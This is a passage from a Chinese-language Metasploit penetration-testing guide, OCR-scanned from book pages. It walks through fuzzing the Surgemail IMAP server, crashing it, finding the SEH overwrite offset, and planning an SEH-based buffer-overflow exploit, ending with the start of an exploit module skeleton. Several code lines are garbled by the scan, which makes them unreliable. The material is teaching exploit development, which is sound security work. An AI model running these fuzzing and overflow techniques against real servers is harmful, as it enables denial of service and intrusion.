break
end
disconnect()
end
end
end
这个Fuzz测试器模块代码在开始时引I用了IMAPO和DoS类?，引用IMAP类可以让你使
用它的登录功能，而由于这个Fuzz测试器的目的是让服务端崩溃，所以这个模块将导致拒绝
服务。
Fuzz测试字符串（我们要发送给服务端的畸形数据）被设置为最大长度为1024字节的一
个由字母和数字组成的随机化串③，然后Fuzz测试器连接并登录到远程的服务上·，如果连接
不上的话，说明服务端已经宕掉了，这种情况就需要你进一步深入调查了，服务端不再响应可
能意味着你已经成功导致了远程服务进程的一个异常。
LIST命令构造出一个恶意的请求?，在发送给远程服务后，如果Fuzz测试器没有收到来自服
务端的响应，将打印出“Servercrashed,noresponse”的消息后退出。
为了测试你所编写的这个新的Fuzz测试器，请启动MSF终端，装载这个模块，并如下设
置它的配置选项：
msf>use auxiliary/fuzzers/imap_fuzz
msf auxiliary(imap_fuzz)>show options
Module options:
Name
Current SettingRequiredDescription
IMAPPASS
no
The password for the specified username
IMAPUSER
no
The username to authenticate as
RHOST
yes
The target address
RPORT
143
yes
The target port
msf auxiliary(imap_fuzz)>set IMAPPASS test
IMAPPASS=>test
msf auxiliary(imap_fuzz) > set IMAPUsER test
IMAPUSER=>test
msf auxiliary(imap_fuzz)>set RH0ST192.168.1.155
RHOST => 192.168.1.155
msf auxiliary(imap_fuzz)>
199
---
## Page 227
Metasploit渗透测试指南
这个Fuzz测试器已经准备好运行了，请准备好你所选择的调试器（我们在这里使用
ImmunityDebugger）并附加到surgemail.exe进程上，然后运行Fuzz测试器：
msf auxiliary(imap_fuzz)>run
O[*]Authenticating astestwithpassword test...
[*]Generating fuzzed data...
?[*]Sendingfuzzed data，buffer length=684
③[*]0002 LIST（）"/v1AD7DnJTVykXGYYM6BmnXuYR1ZNIJUzQzFPvASjYxzdTTOngBJ5gfKoXjLy3CiAAk1Fmo0
RPEpq6f4BBnp5jm3LuSbA0j1M5qULEGEv0DMk0o0PUj6XPN1VwxFpjAfFeAxykiwdDiqNwnVJAKyr6X7C5ije7
rfUGJ8bvjTMSxKihrDMk6BxAnY6kjFGDi5o8hcEag4tzJ1FhH9eI2UHDVbsDmUHTfAFbreJTHV1cIruAozmZKz
i7XgTaOgzGh"“"pWNED"
[*]0002 OK LIST completed
··.SNIP、··
[*]Authenticatingastestwithpasswordtest..
[*]Generatingfuzzed data...
[*]Sendingfuzzed data，bufferlength=1007
[*]0002LIST （)"/FzwJjIcL16vW4PXDPpJbpsHB4p7Xts9fbaJYjRJASXRqbZnOMzprZfVZH7BYvcHuw1NoYq
9MC8PZy0frCiPBqZ4xn0biAjFTH5LsCjIFuI5eZ9LsdXdek7iiOhEmW6D86mAtyg9S1a7RALrbRcLIHJpwMsEE
5LS1wIV9aFPS6RQwI4DtF4bGS1e1FCyf63hy3Vo8AKkId6yu5MfjwfUExandVeU1dk8c5bhlyqoDp3UX2C1QPZ
01oV9u6Fwa016sR6oLoPng9MYNwTMXTUdiE7r0juOmkdgg1PTkZ3n4de1FEaLh8Xhf9SNSPZUXoM7gmUiyNYv6
AsDFuEY9Hq9UOQSmZ6ySunifPFjCbDs4ZooquwOHPaVnbNVo97tfVBYSei9dWCUWwUAPVJVsTGoDNRVarOrg8q
[*]Server crashed，noresponse
[*]Auxiliary module execution completed
msf auxiliary(imap_fuzz)>
在输出结果中，可以看到Fuzz测试器连接并登录了远程的IMAP服务端O，并生成了一个
随机化字符串?，然后将构造好的恶意请求发送给服务端，接收到响应并显示出来·。如果
Fuzz测试器没有收到任何响应，你将看到一个告知服务端已经崩溃的提示，这为你查看调试
器中记录信息提供了线索。
这时在Windows靶机上检查你的调试器，应该可以看到调试器已经在服务进程崩溃点上挂
起了，如图14-1所示。检查崩溃点，你会看到这时候还没有任何内存地址被覆盖，不幸的是，
看起来好像没有任何能够真正实施溢出攻击的地方。在进一步考虑增大缓冲区的长度后，你会
发现如果发送一个达到11,000字节长度的字符串后，可以覆盖掉结构化异常处理链（SEH)。通
200
---
## Page 228
第14章创建你自己的渗透攻击模块
过控制SEH可以让你的渗透代码更加可靠，并让它更为通用。同样地，使用一个应用程序DLL
中的返回地址可以让你的渗透代码能够适用于不同的操作系统版本。
Immunity Debugger-surgemail.exe-[CPU-thread 00000294,module surgemai]
网O口
FileView Debug Plugins ImmLibOptionsWindowHelpJobs
-0×
086044611
HORT41901.06044
DHORDPTRS[E04+GD44EE]
g1.002E40
ADOSSE
ehai.00600130
PUSH
FUSH
ADD
图14-1调试器在崩溃点挂起
发送一个11,000字节长度的字符串，我们只需要在Fuzz测试器源码中进行一点小的修改，
如下所示：
print_status("Generating fuzzed data...")
fuzzed ="A" * 11000
print_status("Sending fuzzed data, buffer length = %d"% fuzzed.length)
"u\I\+"O3NMd ".+ pazzn +./()1SI7 zooo,= ba1
这段代码并没有使用了随机化的字符串，而是发送了11，000个字符A来构造恶意请求。
14.2控制结构化异常处理链
如果你重新启动surgemail服务，重新将调试器附加上去，并再次运行Fuzz测试器，你可
以看到调试器中Fuzz出来的崩溃点。如果你使用的是ImmunityDebugger，你可以选择View->
SEHChain菜单项来查看SEH链的内容，右键点击值，应该是41414141，然后选择“Follow
address instack”，可以在图14-2所示的右下框中显示出导致SEH改写的堆栈内容。
201
---
## Page 229
Metasploit渗透测试指南
ImmunityDebugger-surgemail.exe-[CPU-thread000005B4,module surgemai]
网OO
FileViewDebugPluginsImmLibOptionsWindowHelpJobs
s？
69759251
MOUDOROPTRDS:[EDI]E
ROU
DEEFEFTRDS:【EC】
2OF
FFFFFFF
DWORO PTR DS:[ECX]
ADD
61018181.0076A251
TESTE
TESTC
9.0076A2
FF001.0076025
TESTED
DOORDTPTRDSEDID
M
ngto[03710000]-useShift+F7/F8/F9.to
图14-2改写后的SEH链条目
你已经知道了可以通过发送一个超长字符串，来控制存有漏洞的surgemail服务进程的SEH
链，现在是时候来确定在目标系统上进行SEH覆盖所需要的缓冲区精确长度了，如果你还记得
我们对渗透代码开发的讨论，在你使用一个返回地址之前，你首先需要找出溢出和覆盖发生的
精确位置。
修改下Fuzz测试器的代码，创建出一个指定长度但每个字节内容不会重复的随机化字符
串，如下所示：
print_status("Generating fuzzed data...")
fuzzed=Rex::Text.pattern_create(11000)
print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length)
req ='ooO2 LIST （)"/′+ fuzzed +‘" "pWNED"’+"\r\n"
在这段代码中，我们使用了Rex:Text.patterm_create在Fuzz测试器中生成了一个不会重复
的随机化字符串，现在重新运行Fuzz测试器，结果显示SEH被覆盖改写为“684E3368”（在
你的运行中很可能是另外一个随机数），如图14-3所示。
020EFF704E82684E Nh2N Pointer tonegt SEH re0ord
32D3FF74
684E3368 h3Hh SE handler
8203FF78
684E37681
h
39684E88_8N9
图14-3SEH被覆盖改写为随机字符串
202
---
## Page 230
第14章创建你自已的渗透攻击模块
在使用我们的随机字符串覆盖SEH之后，可以利用在/opt/metasploit3/msf3/tools/路径下的
pattern_offset.rb程序来精确计算覆盖发生的位置，只需要将关注的字符串（684E3368）和发向
目标字符串的长度（ll000）作为参数传给patterm_offset就可以了，如下所示：
root@bt:~/.msf3/modules/auxiliary/fuzzers#/opt/metasploit3/msf3/tools/pattern_offset.rb
684E3368 11000
10360
返回结果10,360表示覆盖了SEH的四个字节分别是在10,361-10,364位置，现在我们可以
最后一次改写Fuzz测试器的代码，来验证我们的发现。
print_status("Generating fuzzed data...")
99*x>>pz20*x>>po901*x=pz0
print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length)
接着是4个字节的字符B（十六进制值42）来覆盖SEH，然后是636个字符C（十六进制值43）
来填充以保持字符串长度还是11，000字节。
中了。
ImmunityDebugger-surgemail.exe-[CPU-thread 00000838,module surgemai]
DosEHxNilHHii4lemtwhcPkbz
15289260
OUDOROPTRDS:【EDI]
RegisrersirRU及
200
DEFEEPTROS:【ECN3
FFFFFFI
DORD FTRDS:[EC]
TESTEA
N19em81.06769298
TE.ST
878681.00629
PDG
图14-4完全控制SEH
203
---
## Page 231
Metasploit渗透测试指南
14.3绕过SEH限制
在SEH的覆盖点之后，在栈底前面只留下了很小的空间来放置Shellcode。通常情况下，我
们会使用一组POP-POP-RETN指令来达到下一个SEH点（NSEH），然后通过一个短跳转指令
（shortjump）进入到Shellcode中。我们在编写下面的渗透代码时，将克服这个空间大小限制，
从而为最终的攻击载荷提供尽可能大的空间。在这个时候，我们已经完成了对漏洞的Fuzz测试
过程，将进入到为我们发现的这个漏洞开开发渗透代码的阶段。
这个渗透攻击案例情况下需要使用egghunter模式来完成攻击载荷的执行，即通过一小段
的shellcode从内存中寻找真正的攻击载荷体。但是，我们在这里将使用一一种不同的战术实施攻
击，以POP-POP-RETN指令指针来覆盖SEH，覆盖之后，我们会做一个只需要很少指令的向
后短跳转（shortjump），接下来我们将使用通过短跳转获取到的空间来执行一次跳入一段NOP
空指令和shellcode的近跳转（nearjump）。虽然不是必需的，但是一段NOP空指令通常对一次
渗透攻击来说是有益的，因为它们可以给你提供在内存中缓冲区位置变化时的一段错误容忍空
间，而这些NOP指令不会对你的渗透代码造成任何负面影响，因而常被作为填充。理想情况下，
这次攻击的载荷看起来如下：
[一段任意的缓冲区填充INOP空指令滑行区IShellcode|近跳转|短跳转|POP-POP-RETN]
为了保证渗透代码在不同版本Windows系统间的通用性，我们可以从一个应用程序的DLL
或可执行文件中搜索返回地址。在这个案例中，只有应用程序的可执行文件是可用的，所以你
可以从surgemail.exe文件中尝试找出一个POP-POP-RETN指令序列来覆盖SEH，这样的话渗
透代码就可以适用于不同的Windows系统版本了。
初始代码骨架，保存在/root.msf3/modules/exploits/windows/imap/目录。
require'msf/core'
classMetasploit3'Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow',
'Description'=>%q{
This module exploits a stack overflow in the Surgemail IMAP Server
 P  i  i  s Aq -s i
account credentials are required.
'Author'
=>['ryujin'],
'License'
=> MSF_LICENSE,
'Version'
=>'$Revision:1 $',
204
---
## Page 232
第14章创建你自己的渗透攻击模块
References
=>
‘BID'，'28260′]，
'CVE'，'2008-1498′]，
[‘URL'，‘http://www.exploit-db.com/exploits/5259′],
'Privileged'
=> false,
'DefaultOptions'
=>
'EXITFUNC'=>‘thread',
}，
.peorred.
=>
{
0'Space'
=>10351,
'DisableNops'
=>true,
'BadChars
=>"\x00"
'Platform'
=>'win',
'Targets'
=>